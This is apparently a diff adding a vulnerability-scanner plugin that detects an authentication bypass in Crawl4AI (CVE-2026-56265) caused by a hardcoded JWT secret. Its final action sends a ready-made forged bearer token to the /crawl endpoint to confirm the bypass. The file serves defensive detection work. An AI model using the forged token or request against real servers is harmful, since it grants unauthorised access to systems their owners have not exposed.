@@ -1,0 +1,126 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Crawl4AI_CVE_2026_56265"
+  author: "mangeshwalsane2-hash"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE-2026-56265"
+  }
+  severity: HIGH
+  title: "Authentication Bypass via Hardcoded Default Secret Key in Crawl4AI"
+  description: "Crawl4AI versions prior to 0.8.7 contain an authentication bypass vulnerability in the Docker API deployment. In auth.py, the JWT verification logic uses a hardcoded fallback signing secret (SECRET_KEY = os.environ.get(\"SECRET_KEY\", \"mysecret\")). When JWT authentication is enabled on the server without explicitly specifying a custom SECRET_KEY, the service defaults to \"mysecret\", allowing unauthenticated remote attackers to forge valid JWT tokens and bypass authentication."
+  recommendation: "Upgrade Crawl4AI to version 0.8.7 or higher, and explicitly set a strong random SECRET_KEY environment variable if JWT authentication is enabled."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2026-56265"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_crawl4ai"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "<title>Crawl4AI"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "check_auth_enabled"
+  http_request: {
+    method: POST
+    uri: "/md"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      }
+    ]
+    data: "{\"url\": \"raw://<html><body><div>test</div></body></html>\"}"
+    response: {
+      http_status: 401
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "Authentication required"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "trigger_auth_bypass"
+  http_request: {
+    method: POST
+    uri: "/crawl"
+    headers: [
+      {
+        name: "Content-Type"
+        value: "application/json"
+      },
+      {
+        name: "Authorization"
+        value: "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiAiYWRtaW5AZXhhbXBsZS5jb20iLCAiZXhwIjogMTgyMjczMDk2Mn0.lD8cHXbwsw_Yw_oqEpI4rNz-9SOfPX2IBzzIpZQtfG8"
+      }
+    ]
+    data: "{\"urls\": [\"raw://<html><body><div>test</div></body></html>\"]}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          {
+            body: {}
+            contains: "\"cleaned_html\""
+          },
+          {
+            body: {}
+            contains: "\"success\""
+          }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_crawl4ai",
+    "check_auth_enabled",
+    "trigger_auth_bypass"
+  ]
+}
+
